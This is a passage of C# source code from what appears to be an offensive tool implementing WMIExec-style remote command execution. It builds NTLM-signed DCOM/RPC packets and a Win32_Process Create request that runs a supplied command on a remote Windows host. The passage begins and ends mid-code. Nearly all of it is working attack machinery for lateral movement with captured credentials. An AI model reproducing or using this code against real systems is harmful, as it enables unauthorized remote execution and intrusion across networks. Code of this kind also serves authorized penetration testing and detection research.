                            .Concat(Utilities.GetByteRange(NTLMSSP_Verifier, 0, 11)).ToArray();
                        
                        byte[] RPC_Signature = HMAC_MD5.ComputeHash(RPC_Sign);
                        RPC_Signature = Utilities.GetByteRange(RPC_Signature, 0, 7);
                        Packet_NTLMSSP_Verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = RPC_Signature;
                        NTLMSSP_Verifier = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Verifier);

                        WMI_Client_Send = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC)
                            .Concat(Rem_Query_Interface)
                            .Concat(NTLMSSP_Verifier).ToArray();

                        WMI_Client_Receive = SendStream(WMI_Client_Random_Port_Stream, WMI_Client_Send);

                        if (WMI_Client_Receive[2] == 3 && BitConverter.ToString(Utilities.GetByteRange(WMI_Client_Receive, 24, 27)) == "05-00-00-00")
                        {
                            output.AppendLine(String.Format("{0} WMI access denied on {1}", Output_Username, Target_Long));
                            return output.ToString();
                        }
                        else if (WMI_Client_Receive[2] == 3 && BitConverter.ToString(Utilities.GetByteRange(WMI_Client_Receive, 24, 27)) != "05-00-00-00")
                        {
                            string Error_Code = BitConverter.ToString(new byte[] { WMI_Client_Receive[27], WMI_Client_Receive[26], WMI_Client_Receive[25], WMI_Client_Receive[24] });
                            string[] Error_Code_Array = Error_Code.Split('-');
                            Error_Code = string.Join("", Error_Code_Array);
                            output.AppendLine(String.Format("Error Code: 0x{0}", Error_Code.ToString()));
                            return output.ToString();
                        }
                        else if (WMI_Client_Receive[2] == 2)
                        {
                            WMI_Data = BitConverter.ToString(WMI_Client_Receive).Replace("-", "");
                            OXID_Index = WMI_Data.IndexOf(OXID);
                            OXID_Bytes_Index = OXID_Index / 2;
                            Object_UUID2 = Utilities.GetByteRange(WMI_Client_Receive, OXID_Bytes_Index + 16, OXID_Bytes_Index + 31);
                            WMI_Client_Stage = "AlterContext";
                        }
                        else
                        {
                            output.AppendLine("An Unkonwn Error Occured");
                            return output.ToString();
                        }

                        //Moving on to Command Execution
                        int Request_Split_Index = 5500;
                        string WMI_Client_Stage_Next = "";
                        bool Request_Split = false;

                        while (WMI_Client_Stage != "exit")
                        {
                            if (debug) { output.AppendLine(WMI_Client_Stage); }
                            if (WMI_Client_Receive[2] == 3)
                            {
                                string Error_Code = BitConverter.ToString(new byte[] { WMI_Client_Receive[27], WMI_Client_Receive[26], WMI_Client_Receive[25], WMI_Client_Receive[24] });
                                string[] Error_Code_Array = Error_Code.Split('-');
                                Error_Code = string.Join("", Error_Code_Array);
                                output.AppendLine(String.Format("Execution failed with error code: 0x{0}", Error_Code.ToString()));
                                WMI_Client_Stage = "exit";
                            }

                            switch (WMI_Client_Stage)
                            {
                                case "AlterContext":
                                    {
                                        switch (Sequence_Number[0])
                                        {
                                            case 0:
                                                {
                                                    Alter_Context_Call_ID = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                    Alter_Context_Context_ID = new byte[] { 0x02, 0x00 };
                                                    Alter_Context_UUID = new byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 };
                                                    WMI_Client_Stage_Next = "Request";
                                                }
                                                break;
                                            case 1:
                                                {
                                                    Alter_Context_Call_ID = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                    Alter_Context_Context_ID = new byte[] { 0x03, 0x00 };
                                                    Alter_Context_UUID = new byte[] { 0x18, 0xad, 0x09, 0xf3, 0x6a, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 };
                                                    WMI_Client_Stage_Next = "Request";
                                                }
                                                break;
                                            case 6:
                                                {
                                                    Alter_Context_Call_ID = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                    Alter_Context_Context_ID = new byte[] { 0x04, 0x00 };
                                                    Alter_Context_UUID = new byte[] { 0x99, 0xdc, 0x56, 0x95, 0x8c, 0x82, 0xcf, 0x11, 0xa3, 0x7e, 0x00, 0xaa, 0x00, 0x32, 0x40, 0xc7 };
                                                    WMI_Client_Stage_Next = "Request";
                                                }
                                                break;
                                        }
                                        Packet_RPC = WMIExec.RPCAlterContext(Assoc_Group, Alter_Context_Call_ID, Alter_Context_Context_ID, Alter_Context_UUID);
                                        WMI_Client_Send = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC);
                                        WMI_Client_Receive = SendStream(WMI_Client_Random_Port_Stream, WMI_Client_Send);
                                        WMI_Client_Stage = WMI_Client_Stage_Next;
                                    }
                                    break;
                                case "Request":
                                    {
                                        switch (Sequence_Number[0])
                                        {
                                            case 0:
                                                {
                                                    Sequence_Number = new byte[] { 0x01, 0x00, 0x00, 0x00 };
                                                    Request_Flags = new byte[] { 0x83 };
                                                    Request_Auth_Padding = 12;
                                                    Request_Call_ID = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                    Request_Context_ID = new byte[] { 0x02, 0x00 };
                                                    Request_Opnum = new byte[] { 0x03, 0x00 };
                                                    Request_UUID = Object_UUID2;
                                                    Hostname_Length = BitConverter.GetBytes(Auth_Hostname.Length + 1);
                                                    WMI_Client_Stage_Next = "AlterContext";

                                                    if (Convert.ToBoolean(Auth_Hostname.Length % 2))
                                                    {
                                                        Auth_Hostname_Bytes = Auth_Hostname_Bytes.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                                                    }
                                                    else
                                                    {
                                                        Auth_Hostname_Bytes = Auth_Hostname_Bytes.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                    }

                                                    Stub_Data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(Causality_ID_Bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 })
                                                        .Concat(Hostname_Length)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(Hostname_Length)
                                                        .Concat(Auth_Hostname_Bytes)
                                                        .Concat(Process_ID_Bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                }
                                                break;
                                            case 1:
                                                {
                                                    Sequence_Number = new byte[] { 0x02, 0x00, 0x00, 0x00 };
                                                    Request_Flags = new byte[] { 0x83 };
                                                    Request_Auth_Padding = 8;
                                                    Request_Call_ID = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                    Request_Context_ID = new byte[] { 0x03, 0x00 };
                                                    Request_Opnum = new byte[] { 0x03, 0x00 };
                                                    Request_UUID = IPID;
                                                    WMI_Client_Stage_Next = "Request";
                                                    Stub_Data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(Causality_ID_Bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                }
                                                break;
                                            case 2:
                                                {
                                                    Sequence_Number = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                    Request_Flags = new byte[] { 0x83 };
                                                    Request_Auth_Padding = 0;
                                                    Request_Call_ID = new byte[] { 0x05, 0x00, 0x00, 0x00 };
                                                    Request_Context_ID = new byte[] { 0x03, 0x00 };
                                                    Request_Opnum = new byte[] { 0x06, 0x00 };
                                                    Request_UUID = IPID;
                                                    WMI_Namespace_Length = BitConverter.GetBytes(Target_Short.Length + 14);
                                                    WMI_Namespace_Unicode = Encoding.Unicode.GetBytes("\\\\" + Target_Short + "\\root\\cimv2");
                                                    WMI_Client_Stage_Next = "Request";

                                                    if (Convert.ToBoolean(Target_Short.Length % 2))
                                                    {
                                                        WMI_Namespace_Unicode = WMI_Namespace_Unicode.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                    }
                                                    else
                                                    {
                                                        WMI_Namespace_Unicode = WMI_Namespace_Unicode.Concat(new byte[] { 0x00, 0x0 }).ToArray();

                                                    }

                                                    Stub_Data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(Causality_ID_Bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 })
                                                        .Concat(WMI_Namespace_Length)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(WMI_Namespace_Length)
                                                        .Concat(WMI_Namespace_Unicode)
                                                        .Concat(new byte[] { 0x04, 0x00, 0x02, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x2d, 0x00, 0x55, 0x00, 0x53, 0x00, 0x2c, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                   
                                                }
                                                break;
                                            case 3:
                                                {
                                                    Sequence_Number = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                    Request_Flags = new byte[] { 0x83 };
                                                    Request_Auth_Padding = 8;
                                                    Request_Context_ID = new byte[] { 0x00, 0x00 };
                                                    Request_Call_ID = new byte[] { 0x06, 0x00, 0x00, 0x00 };
                                                    Request_Opnum = new byte[] { 0x05, 0x00 };
                                                    Request_UUID = Object_UUID;
                                                    WMI_Client_Stage_Next = "Request";
                                                    WMI_Data = BitConverter.ToString(WMI_Client_Receive).Replace("-", "");
                                                    OXID_Index = WMI_Data.IndexOf(OXID);
                                                    OXID_Bytes_Index = OXID_Index / 2;
                                                    IPID2 = Utilities.GetByteRange(WMI_Client_Receive, OXID_Bytes_Index + 16, OXID_Bytes_Index + 31);
                                                    OrderedDictionary Packet_rem_release = WMIExec.DCOMRemRelease(Causality_ID_Bytes, Object_UUID2, IPID);
                                                    Stub_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_rem_release);
                                                }
                                                break;
                                            case 4:
                                                {
                                                    Sequence_Number = new byte[] { 0x05, 0x00, 0x00, 0x00 };
                                                    Request_Flags = new byte[] { 0x83 };
                                                    Request_Auth_Padding = 4;
                                                    Request_Context_ID = new byte[] { 0x00, 0x00 };
                                                    Request_Call_ID = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                                    Request_Opnum = new byte[] { 0x03, 0x00 };
                                                    Request_UUID = Object_UUID;
                                                    WMI_Client_Stage_Next = "Request";
                                                    Packet_Rem_Query_Interface = WMIExec.DCOMRemQueryInterface(Causality_ID_Bytes, IPID2, new byte[] { 0x9e, 0xc1, 0xfc, 0xc3, 0x70, 0xa9, 0xd2, 0x11, 0x8b, 0x5a, 0x00, 0xa0, 0xc9, 0xb7, 0xc9, 0xc4 });
                                                    Stub_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_Rem_Query_Interface);


                                                }
                                                break;
                                            case 5:
                                                {
                                                    Sequence_Number = new byte[] { 0x06, 0x00, 0x00, 0x00 };
                                                    Request_Flags = new byte[] { 0x83 };
                                                    Request_Auth_Padding = 4;
                                                    Request_Call_ID = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                    Request_Context_ID = new byte[] { 0x00, 0x00 };
                                                    Request_Opnum = new byte[] { 0x03, 0x00 };
                                                    Request_UUID = Object_UUID;
                                                    WMI_Client_Stage_Next = "AlterContext";
                                                    Packet_Rem_Query_Interface = WMIExec.DCOMRemQueryInterface(Causality_ID_Bytes, IPID2, new byte[] { 0x83, 0xb2, 0x96, 0xb1, 0xb4, 0xba, 0x1a, 0x10, 0xb6, 0x9c, 0x00, 0xaa, 0x00, 0x34, 0x1d, 0x07 });
                                                    Stub_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_Rem_Query_Interface);
                                                }
                                                break;
                                            case 6:
                                                {
                                                    Sequence_Number = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                                    Request_Flags = new byte[] { 0x83 };
                                                    Request_Auth_Padding = 0;
                                                    Request_Context_ID = new byte[] { 0x04, 0x00 };
                                                    Request_Call_ID = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                    Request_Opnum = new byte[] { 0x06, 0x00 };
                                                    Request_UUID = IPID2;
                                                    WMI_Client_Stage_Next = "Request";

                                                    Stub_Data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(Causality_ID_Bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x70, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                }
                                                break;
                                            case 7:
                                                {
                                                    Sequence_Number = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                    Request_Flags = new byte[] { 0x83 };
                                                    Request_Auth_Padding = 0;
                                                    Request_Context_ID = new byte[] { 0x04, 0x00 };
                                                    Request_Call_ID = new byte[] { 0x10, 0x00, 0x00, 0x00 };
                                                    Request_Opnum = new byte[] { 0x06, 0x00 };
                                                    Request_UUID = IPID2;
                                                    WMI_Client_Stage_Next = "Request";

                                                    Stub_Data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(Causality_ID_Bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x70, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                }
                                                break;
                                            default:
                                                {
                                                    if (Sequence_Number[0] >= 8)
                                                    {
                                                        Sequence_Number = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                        Request_Auth_Padding = 0;
                                                        Request_Context_ID = new byte[] { 0x04, 0x00 };
                                                        Request_Call_ID = new byte[] { 0x0b, 0x00, 0x00, 0x00 };
                                                        Request_Opnum = new byte[] { 0x18, 0x00 };
                                                        Request_UUID = IPID2;
                                                        byte[] Stub_Length = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 1769), 0, 1);
                                                        byte[] Stub_Length2 = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 1727), 0, 1); ;
                                                        byte[] Stub_Length3 = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 1713), 0, 1);
                                                        byte[] Command_Length = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 93), 0, 1);
                                                        byte[] Command_Length2 = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 16), 0, 1);
                                                        byte[] Command_Bytes = Encoding.UTF8.GetBytes(command);

                                                        string Command_Padding_Check = Convert.ToString(Decimal.Divide(command.Length, 4));
                                                        if (Command_Padding_Check.Contains(".75"))
                                                        {
                                                            Command_Bytes = Command_Bytes.Concat(new byte[] { 0x00 }).ToArray();
                                                        }
                                                        else if (Command_Padding_Check.Contains(".5"))
                                                        {
                                                            Command_Bytes = Command_Bytes.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                                                        }
                                                        else if (Command_Padding_Check.Contains(".25"))
                                                        {
                                                            Command_Bytes = Command_Bytes.Concat(new byte[] { 0x00, 0x00, 0x00 }).ToArray();
                                                        }
                                                        else
                                                        {
                                                            Command_Bytes = Command_Bytes.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                        }

                                                        Stub_Data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                            .Concat(Causality_ID_Bytes)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x06, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x63, 0x00, 0x72, 0x00, 0x65, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 })
                                                            .Concat(Stub_Length)
                                                            .Concat(new byte[] { 0x00, 0x00})
                                                            .Concat(Stub_Length)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x4d, 0x45, 0x4f, 0x57, 0x04, 0x00, 0x00, 0x00, 0x81, 0xa6, 0x12, 0xdc, 0x7f, 0x73, 0xcf, 0x11, 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24, 0x12, 0xf8, 0x90, 0x45, 0x3a, 0x1d, 0xd0, 0x11, 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24, 0x00, 0x00, 0x00, 0x00 })
                                                            .Concat(Stub_Length2)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x78, 0x56, 0x34, 0x12 })
                                                            .Concat(Stub_Length3)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x02, 0x53, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x03, 0x00, 0x00, 0x00, 0x2a, 0x00, 0x00, 0x00, 0x15, 0x01, 0x00, 0x00, 0x73, 0x01, 0x00, 0x00, 0x76, 0x02, 0x00, 0x00, 0xd4, 0x02, 0x00, 0x00, 0xb1, 0x03, 0x00, 0x00, 0x15, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x12, 0x04, 0x00, 0x80, 0x00, 0x5f, 0x5f, 0x50, 0x41, 0x52, 0x41, 0x4d, 0x45, 0x54, 0x45, 0x52, 0x53, 0x00, 0x00, 0x61, 0x62, 0x73, 0x74, 0x72, 0x61, 0x63, 0x74, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x94, 0x00, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x41, 0x50, 0x49, 0x7c, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x7c, 0x6c, 0x70, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x20, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0xca, 0x00, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x59, 0x01, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0xca, 0x00, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x11, 0x01, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0xe2, 0x01, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x41, 0x50, 0x49, 0x7c, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x7c, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x7c, 0x6c, 0x70, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x20, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x2b, 0x02, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0xda, 0x01, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xba, 0x02, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x2b, 0x02, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0xda, 0x01, 0x00, 0x00, 0x72, 0x02, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x00, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x03, 0x00, 0x00, 0x00, 0x57, 0x4d, 0x49, 0x7c, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x5f, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x66, 0x03, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x44, 0x03, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xf5, 0x03, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x66, 0x03, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x44, 0x03, 0x00, 0x00, 0xad, 0x03, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 